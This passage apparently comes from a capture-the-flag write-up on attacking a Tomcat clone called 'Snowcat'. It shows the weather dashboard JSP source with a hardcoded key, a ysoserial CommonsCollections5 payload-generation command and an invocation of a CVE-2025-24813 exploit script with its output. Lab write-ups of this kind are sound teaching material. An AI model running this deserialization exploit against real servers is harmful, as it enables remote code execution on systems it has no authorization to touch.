<span class="w">      </span><span class="s2">&quot;http://</span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">/&quot;</span>

<span class="w">    </span><span class="c1"># Privilege Escalation</span>
<span class="w">    </span>The<span class="w"> </span>Snowcat<span class="w"> </span>server<span class="w"> </span>still<span class="w"> </span>uses<span class="w"> </span>some<span class="w"> </span>C<span class="w"> </span>binaries<span class="w"> </span>from<span class="w"> </span>an<span class="w"> </span>older<span class="w"> </span>system<span class="w"> </span>iteration.
<span class="w">    </span>Replacing<span class="w"> </span>these<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>logged<span class="w"> </span>as<span class="w"> </span>technical<span class="w"> </span>debt.
<span class="w">    </span>&lt;TOOD_INSERT_ELF_NAME&gt;<span class="w"> </span>said<span class="w"> </span>he<span class="w"> </span>thought<span class="w"> </span>these<span class="w"> </span>components<span class="w"> </span>might<span class="w"> </span>create<span class="w"> </span>a<span class="w"> </span>privilege<span class="w"> </span>escalation<span class="w"> </span>vulnerability.
<span class="w">    </span>Can<span class="w"> </span>you<span class="w"> </span>prove<span class="w"> </span>these<span class="w"> </span>components<span class="w"> </span>are<span class="w"> </span>vulnerable<span class="w"> </span>by<span class="w"> </span>retrieving<span class="w"> </span>the<span class="w"> </span>key<span class="w"> </span>that<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>used<span class="w"> </span>by<span class="w"> </span>the<span class="w"> </span>Snowcat<span class="w"> </span>hosted<span class="w"> </span>Neighborhood<span class="w"> </span>Weather<span class="w"> </span>Monitoring<span class="w"> </span>Station?
</code></pre></div>
</details>
<p>The notes confirm we're dealing with a Tomcat derivative (hence "Snowcat" - get it?) and point us toward a deserialization attack. The weather JSPs are our target application. Time to check out the dashboard and see what we're up against.</p>
<details class="example">
<summary>weather-jsps/dashboard.jsp - Weather Monitoring Code</summary>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="k">&lt;%@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s">&quot;java&quot;</span><span class="w"> </span><span class="n">contentType</span><span class="o">=</span><span class="s">&quot;text/html; charset=UTF-8&quot;</span><span class="w"> </span><span class="n">pageEncoding</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="k">%&gt;</span>
<span class="w">    </span><span class="k">&lt;%@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&quot;java.io.*&quot;</span><span class="w"> </span><span class="k">%&gt;</span>
<span class="w">    </span><span class="k">&lt;%@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&quot;org.apache.commons.collections.map.*&quot;</span><span class="w"> </span><span class="k">%&gt;</span>
<span class="w">    </span><span class="nt">&lt;html&gt;</span>
<span class="w">    </span><span class="nt">&lt;head&gt;</span>
<span class="w">        </span><span class="nt">&lt;title&gt;</span>Neighborhood<span class="w"> </span>Weather<span class="w"> </span>Monitoring<span class="w"> </span>Station<span class="nt">&lt;/title&gt;</span>
<span class="w">        </span><span class="nt">&lt;link</span><span class="w"> </span><span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;text/css&quot;</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;styles.css&quot;</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;/head&gt;</span>
<span class="w">    </span><span class="nt">&lt;body&gt;</span>
<span class="w">    </span><span class="nt">&lt;div</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;dashboard-container&quot;</span><span class="nt">&gt;</span>
<span class="w">        </span><span class="nt">&lt;h1&gt;</span>Neighborhood<span class="w"> </span>Weather<span class="w"> </span>Monitoring<span class="w"> </span>Station<span class="nt">&lt;/h1&gt;</span>
<span class="w">        </span><span class="nt">&lt;p&gt;</span>Providing<span class="w"> </span>real-time<span class="w"> </span>Neighborhood<span class="w"> </span>weather<span class="w"> </span>monitoring<span class="w"> </span>since<span class="w"> </span>2022.<span class="nt">&lt;/p&gt;</span>
<span class="w">        </span><span class="k">&lt;%</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">session</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// No valid session, redirect to login page</span>
<span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">sendRedirect</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="k">return</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">firstname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&quot;firstname&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">lastname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&quot;lastname&quot;</span><span class="p">);</span>

<span class="w">            </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;&lt;h2&gt;Welcome, &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">firstname</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">lastname</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;&lt;/h2&gt;&quot;</span><span class="p">);</span>

<span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6&quot;</span><span class="p">;</span>
<span class="w">                </span><span class="n">Process</span><span class="w"> </span><span class="n">tempProc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;/usr/local/weather/temperature &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">key</span><span class="p">);</span>
<span class="w">                </span><span class="n">Process</span><span class="w"> </span><span class="n">humProc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;/usr/local/weather/humidity &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">key</span><span class="p">);</span>
<span class="w">                </span><span class="n">Process</span><span class="w"> </span><span class="n">presProc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;/usr/local/weather/pressure &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">key</span><span class="p">);</span>

<span class="w">                </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">tempReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">tempProc</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()));</span>
<span class="w">                </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">humReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">humProc</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()));</span>
<span class="w">                </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">presReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">presProc</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()));</span>

<span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">tempLine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tempReader</span><span class="p">.</span><span class="na">readLine</span><span class="p">();</span>
<span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">humLine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">humReader</span><span class="p">.</span><span class="na">readLine</span><span class="p">();</span>
<span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">presLine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">presReader</span><span class="p">.</span><span class="na">readLine</span><span class="p">();</span>

<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tempLine</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">humLine</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">presLine</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;&lt;p&gt;Error: Unable to retrieve weather data. Please try again later.&lt;/p&gt;&quot;</span><span class="p">);</span>
<span class="w">                    </span><span class="k">return</span><span class="p">;</span>
<span class="w">                </span><span class="p">}</span>

<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">temperature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Float</span><span class="p">.</span><span class="na">parseFloat</span><span class="p">(</span><span class="n">tempLine</span><span class="p">);</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">humidity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Float</span><span class="p">.</span><span class="na">parseFloat</span><span class="p">(</span><span class="n">humLine</span><span class="p">);</span>
<span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">pressure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="n">presLine</span><span class="p">);</span><span class="w"> </span><span class="c1">// Parse pressure as integer</span>

<span class="w">                </span><span class="c1">// Define min and max values using Apache Commons Collections MultiValueMap</span>
<span class="w">                </span><span class="n">MultiValueMap</span><span class="w"> </span><span class="n">ranges</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MultiValueMap</span><span class="p">();</span>

<span class="w">                </span><span class="n">ranges</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;temperature&quot;</span><span class="p">,</span><span class="w"> </span><span class="mf">70.0f</span><span class="p">);</span>
<span class="w">                </span><span class="n">ranges</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;temperature&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mf">50.0f</span><span class="p">);</span>

<span class="w">                </span><span class="n">ranges</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;humidity&quot;</span><span class="p">,</span><span class="w"> </span><span class="mf">100.0f</span><span class="p">);</span>
<span class="w">                </span><span class="n">ranges</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;humidity&quot;</span><span class="p">,</span><span class="w"> </span><span class="mf">0.0f</span><span class="p">);</span>

<span class="w">                </span><span class="n">ranges</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;pressure&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">950</span><span class="p">);</span>
<span class="w">                </span><span class="n">ranges</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;pressure&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1050</span><span class="p">);</span>

<span class="w">                </span><span class="c1">// Retrieve min and max values for normalization</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">tempMin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="w"> </span><span class="n">ranges</span><span class="p">.</span><span class="na">getCollection</span><span class="p">(</span><span class="s">&quot;temperature&quot;</span><span class="p">).</span><span class="na">toArray</span><span class="p">()</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">;</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">tempMax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="w"> </span><span class="n">ranges</span><span class="p">.</span><span class="na">getCollection</span><span class="p">(</span><span class="s">&quot;temperature&quot;</span><span class="p">).</span><span class="na">toArray</span><span class="p">()</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="p">;</span>

<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">humMin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="w"> </span><span class="n">ranges</span><span class="p">.</span><span class="na">getCollection</span><span class="p">(</span><span class="s">&quot;humidity&quot;</span><span class="p">).</span><span class="na">toArray</span><span class="p">()</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">;</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">humMax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="w"> </span><span class="n">ranges</span><span class="p">.</span><span class="na">getCollection</span><span class="p">(</span><span class="s">&quot;humidity&quot;</span><span class="p">).</span><span class="na">toArray</span><span class="p">()</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="p">;</span>

<span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">presMin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">ranges</span><span class="p">.</span><span class="na">getCollection</span><span class="p">(</span><span class="s">&quot;pressure&quot;</span><span class="p">).</span><span class="na">toArray</span><span class="p">()</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">;</span>
<span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">presMax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">ranges</span><span class="p">.</span><span class="na">getCollection</span><span class="p">(</span><span class="s">&quot;pressure&quot;</span><span class="p">).</span><span class="na">toArray</span><span class="p">()</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="p">;</span>

<span class="w">                </span><span class="c1">// Normalize values using the ranges</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">normalizedTemperature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">temperature</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">tempMin</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">tempMax</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">tempMin</span><span class="p">);</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">normalizedHumidity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">humidity</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">humMin</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="p">(</span><span class="n">humMax</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">humMin</span><span class="p">);</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">normalizedPressure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">pressure</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">presMin</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">presMax</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">presMin</span><span class="p">);</span>

<span class="w">                </span><span class="c1">// Adjust weights based on normalized values for Kansas December weather</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">tempScore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">temperature</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2.0f</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">1.0f</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="n">temperature</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">6.0f</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">0.5f</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mf">0.0f</span><span class="p">);</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">humScore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">humidity</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">70.0f</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">1.0f</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="n">humidity</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">50.0f</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">0.5f</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mf">0.0f</span><span class="p">);</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">presScore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pressure</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">1015</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">1.0f</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="n">pressure</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">1025</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">0.5f</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mf">0.0f</span><span class="p">);</span>
<span class="w">                </span><span class="kt">float</span><span class="w"> </span><span class="n">likelihood</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tempScore</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">humScore</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">presScore</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">20</span><span class="p">;</span>
<span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">likelihoodLevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">likelihood</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">75</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s">&quot;High&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="n">likelihood</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s">&quot;Medium&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Low&quot;</span><span class="p">);</span>

<span class="w">                </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;&lt;p&gt;Likelihood of snow: &lt;strong&gt;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">likelihoodLevel</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;&lt;/strong&gt;&lt;/p&gt;&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;&lt;p&gt;Temperature: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">temperature</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; °C&lt;/p&gt;&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// Explicitly cast to integer</span>
<span class="w">                </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;&lt;p&gt;Humidity: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">humidity</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; %&lt;/p&gt;&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;&lt;p&gt;Pressure: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">pressure</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; hPa&lt;/p&gt;&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// Explicitly cast to integer</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
<span class="w">                </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;&lt;p&gt;Error: Unable to retrieve weather data. Please try again later.&lt;/p&gt;&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="k">%&gt;</span>
<span class="w">    </span><span class="nt">&lt;/div&gt;</span>
<span class="w">    </span><span class="nt">&lt;script</span><span class="w"> </span><span class="na">src=</span><span class="s">&quot;snowflakes.js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="w">    </span><span class="nt">&lt;/body&gt;</span>
<span class="w">    </span><span class="nt">&lt;/html&gt;</span>
</code></pre></div>
</details>
<p>Excellent! The dashboard reveals some <em>juicy</em> details:</p>
<p>Imports <code>org.apache.commons.collections.map.*</code> (our deserialization gadget chain is already gift wrapped!)</p>
<p>Weather data flows from binaries at <code>/usr/local/weather/{temperature,humidity,pressure}</code></p>
<p>An authorization key sits right there in the code: <code>4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</code></p>
<p>That key belongs to the weather monitoring system itself. Tom wants the other application's key, so our hunt continues!</p>
<hr />
<h3 id="weaponizing-the-tomcat-clone">Weaponizing the Tomcat Clone<a class="headerlink" href="#weaponizing-the-tomcat-clone" title="Permanent link">⚓︎</a></h3>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24813">CVE-2025-24813</a> exploits a Java deserialization vulnerability in Tomcat's session persistence mechanism. The attack is beautifully simple: PUT a malicious serialized object to the session endpoint, Tomcat helpfully saves it to disk, then GET the page with that session cookie and... pop goes the weasel! Weasel execu..I mean... code execution achieved!</p>
<p>Tom's provided exploit script automates the whole sleigh ride, but where's the fun in that? We need to understand what's happening under the hood. First, we generate our payload using <code>ysoserial</code> with the <code>CommonsCollections5</code> gadget chain (remember that import we spotted in <code>dashboard.jsp?</code>):</p>
<div class="admonition info">
<p class="admonition-title">Payload Generation</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span>java<span class="w"> </span>-jar<span class="w"> </span>ysoserial.jar<span class="w"> </span>CommonsCollections5<span class="w"> </span><span class="s1">&#39;touch /tmp/frosty_wuz_hear&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span>
</code></pre></div>
</div>
<p>This crafts a serialized payload that executes touch <code>/tmp/frosty_wuz_hear</code> when deserialized. It's our proof of concept, a simple test to verify we have code execution by creating a file in the <code>/tmp</code> directory.</p>
<p><img alt="First screenshot" src="../../img/objectives/o21/s2.png" /></p>
<p>Now we need to capture that base64 output and feed it to Tom's exploit script along with the proper arguments:</p>
<div class="admonition info">
<p class="admonition-title">Exploiting CVE-2025-24813</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nv">PAYLOAD</span><span class="o">=</span><span class="k">$(</span>java<span class="w"> </span>-jar<span class="w"> </span>ysoserial.jar<span class="w"> </span>CommonsCollections5<span class="w"> </span><span class="s1">&#39;touch /tmp/frosty_wuz_hear&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="k">)</span>
<span class="w">    </span>python3<span class="w"> </span>CVE-2025-24813.py<span class="w"> </span>--host<span class="w"> </span>localhost<span class="w"> </span>--port<span class="w"> </span><span class="m">80</span><span class="w"> </span>--base64-payload<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PAYLOAD</span><span class="s2">&quot;</span>
</code></pre></div>
</div>
<details class="example">
<summary>Exploit Output - Success Indicators</summary>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Sending<span class="w"> </span>PUT<span class="w"> </span>request<span class="w"> </span>with<span class="w"> </span>serialized<span class="w"> </span>session<span class="w"> </span>data...
<span class="w">    </span><span class="o">[</span>PUT<span class="o">]</span><span class="w"> </span>Status:<span class="w"> </span><span class="m">409</span><span class="w"> </span>
<span class="w">    </span>&lt;!doctype<span class="w"> </span>html&gt;&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="w"> </span>Status<span class="w"> </span><span class="m">409</span><span class="w"> </span>–<span class="w"> </span>Conflict&lt;/title&gt;&lt;style<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>&gt;body<span class="w"> </span><span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span><span class="o">}</span><span class="w"> </span>h1,<span class="w"> </span>h2,<span class="w"> </span>h3,<span class="w"> </span>b<span class="w"> </span><span class="o">{</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span><span class="w"> </span>h1<span class="w"> </span><span class="o">{</span>font-size:22px<span class="p">;</span><span class="o">}</span><span class="w"> </span>h2<span class="w"> </span><span class="o">{</span>font-size:16px<span class="p">;</span><span class="o">}</span><span class="w"> </span>h3<span class="w"> </span><span class="o">{</span>font-size:14px<span class="p">;</span><span class="o">}</span><span class="w"> </span>p<span class="w"> </span><span class="o">{</span>font-size:12px<span class="p">;</span><span class="o">}</span><span class="w"> </span>a<span class="w"> </span><span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span><span class="w"> </span>.line<span class="w"> </span><span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="w"> </span>Status<span class="w"> </span><span class="m">409</span><span class="w"> </span>–<span class="w"> </span>Conflict&lt;/h1&gt;&lt;hr<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;line&quot;</span><span class="w"> </span>/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;<span class="w"> </span>Status<span class="w"> </span>Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt;<span class="w"> </span>The<span class="w"> </span>request<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>completed<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>conflict<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>state<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>resource.&lt;/p&gt;&lt;hr<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;line&quot;</span><span class="w"> </span>/&gt;&lt;h3&gt;Apache<span class="w"> </span>Tomcat/9.0.90&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
